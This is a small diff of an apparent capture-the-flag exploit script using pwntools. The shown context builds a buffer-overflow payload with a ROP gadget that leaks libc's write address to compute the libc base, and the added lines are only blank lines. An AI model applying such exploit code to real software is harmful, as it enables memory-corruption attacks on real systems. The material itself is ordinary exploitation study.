@@ -28,6 +28,7 @@ io = start()
 #=-=-=- USE BOF TO LEAK LIBC -=-=-=
 
 pop_rsi_r15 = 0x400741
+
 # Set the first argument of the write function in register RSI
 # as the address of the same write function to leak its address,
 # set R15 to any value, then call write function and finally
@@ -38,6 +39,7 @@ payload = b"A"*72 + \
           p64(elf.sym.main)
 io.sendlineafter(b": ", payload)
 data =  io.recvuntil(b'[!] Set your pet companion\'s current status: ')
+
 # Extract the write address from the response and calculate the
 # libc base address by subtracting the write function offset
 # to the leaked address
